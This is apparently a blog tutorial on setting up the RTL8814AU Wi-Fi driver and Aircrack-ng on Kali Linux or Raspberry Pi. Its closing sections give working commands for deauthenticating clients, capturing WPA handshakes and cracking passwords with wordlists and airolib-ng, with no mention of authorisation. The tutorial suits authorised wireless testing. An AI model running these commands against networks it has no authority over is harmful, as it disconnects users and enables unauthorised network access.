---
title: "Using Aircrack-ng with RTL8814AU"
date: "2019-07-28"
lastmod: "2019-07-28"
tags: [Airmon-ng, Aircrack-ng, RTL8814AU, RTL8812AU, Wi-Fi, Kali Linux, Raspberry Pi, ARM]
type: Blog
draft: false
summary: "Setting up and using Aircrack-ng wireless security tools with the RTL8814AU chipset on Linux, including driver installation, monitor mode configuration, and practical wireless testing applications."
license: CC BY-SA 4.0
---
For Kali Linux users who want to hack 2.4/5GHz Wi-Fi.
RTL8812AU/21AU and RTL8814AU are the best chipsets.

Here's the wifi dongle I'm going to use: [TP-LINK Archer T9UH](https://wikidevi.com/wiki/TP-LINK_Archer_T9UH)

![Archer-T9UH.png](/static/images/Archer-T9UH.webp)

Here's the wifi driver I'm going to use: [aircrack-ng/rtl8812au](https://github.com/aircrack-ng/rtl8812au.git)

## Installing Driver

Plug-in your Wi-Fi dongle. Execute `lsusb`.

```sh
lsusb
```

![Archer-T9UH-lsusb.png](/static/images/Archer-T9UH-lsusb.webp)

Check if the device ID is supported by the [driver](https://github.com/aircrack-ng/rtl8812au/blob/v5.6.4.1/os_dep/linux/usb_intf.c#L259)

```c
{USB_DEVICE(0x2357, 0x0106), .driver_info = RTL8814A}, /* TP-LINK Archer T9UH */
```

The ID of TP-LINK Archer T9UH is `2357:0106`.

Clone the project

```sh
git clone https://github.com/aircrack-ng/rtl8812au.git
```

RTL8814AU is newer than RTL8812AU.

Some improvements come with the latest version.

Checkout to the newest git branch.

```sh
git checkout v5.6.4.1
```

The installation is pretty easy. Just use the script.

```sh
sudo apt install dkms
sudo ./dkms-install.sh
```

If you are using ARM CPU such as Raspberry Pi. Change platform in Makefile.

e.g. I'm using RPI 3 B+ with the official Raspbian OS. It's 32 bit.

```sh
sed -i 's/CONFIG_PLATFORM_I386_PC = y/CONFIG_PLATFORM_I386_PC = n/g' Makefile
sed -i 's/CONFIG_PLATFORM_ARM_RPI = n/CONFIG_PLATFORM_ARM_RPI = y/g' Makefile
```

If you are using Kali Linux. You can also install the driver from source.

```sh
sudo apt install realtek-rtl88xxau-dkms
```

## Installing Aircrack-ng

(Aircrack-ng is preinstalled in Kali Linux)

```sh
sudo apt install aircrack-ng
```

Here's the official instruction: [Installing pre-compiled binaries](https://aircrack-ng.org/doku.php?id=install_aircrack#installing_pre-compiled_binaries)

If you want to compile it on your own.

The latest stable version is 1.5.2 currently.

```sh
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
git checkout 1.5.2
```

```sh
sudo apt install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils
```

```sh
./autogen.sh
make
make install
```

## Monitoring Wi-Fi

Check interfaces

```sh
sudo airmon-ng
```

```sh
PHY	Interface	Driver		Chipset

phy0	wlan0		brcmfmac	Broadcom 43430
phy1	wlan1		88XXau		TP-Link
```

Kill all possible programs that could interfere with the wireless card.

```sh
sudo airmon-ng check kill
```

Turn wlan1(RTL8814AU) into monitor mode.

```sh
sudo airmon-ng start wlan1
```

OR

```sh
sudo iwconfig wlan1 mode Monitor
```

Then

```sh
sudo airodump-ng wlan1
```

OR indicate the band 'a' to hop 5GHz

```sh
sudo airodump-ng wlan1 -b a
```

## Crack WPA/WPA2 Wi-Fi Password

Capture Data

```sh
sudo airodump-ng -c 36 –d XX:XX:XX:XX:XX:XX -w hack wlan1
```

De-authenticate the connected clients with `aireplay-ng`

`-0` means de-auth, 50 means 50 counts.  
`-a` sets Access Point MAC address.  
`-c` sets destination MAC address.  

```sh
sudo aireplay-ng -0 50 -a XX:XX:XX:XX:XX:XX -c [Client MAC Address] wlan1
```

You'll get a WPA handshake

![WPA-handshake.png](/static/images/WPA-handshake.webp)

Crack password with dictionary-attack

```sh
aircrack-ng -b XX:XX:XX:XX:XX:XX hack-01.cap -w /path/to/wordlist
```

Here is a project on GitHub for dictionary-attack: [Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)

## Speed up Crack with Airolib-ng

>Airolib-ng is an aircrack-ng suite tool designed to store and manage essid and password lists, compute their Pairwise Master Keys (PMKs) and use them in WPA/WPA2 cracking.

### Download Passwords dictionary

[Probable-Wordlists Downloads](https://github.com/berzerk0/Probable-Wordlists/blob/master/Downloads.md)

### Setting up the database

#### Create SSID list

```sh
airolib-ng wpaDatabase --import essid ssidlist.txt
```

#### Create Password list

```sh
airolib-ng wpaDatabase --import passwd passwords.txt
```

#### Clean Database

```sh
airolib-ng wpaDatabase --clean all
```

#### Create your PMK’s

```sh
airolib-ng wpaDatabase --batch
```

#### Cracking

```sh
aircrack-ng -r wpaDatabase hack-01.cap
```

